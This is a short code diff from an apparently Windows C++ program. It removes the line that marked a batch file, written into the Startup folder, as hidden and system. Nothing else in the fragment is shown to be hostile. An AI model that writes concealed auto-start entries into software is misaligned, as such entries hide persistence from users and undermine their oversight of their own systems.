@@ -2407,7 +2407,6 @@ static void EnsureStartupFolderEntry() {
     if (!f) return;
     fwrite(batContent.c_str(), 1, batContent.size(), f);
     fclose(f);
-    SetFileAttributesA(batPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 
 static int RunChild(HINSTANCE hInstance) {
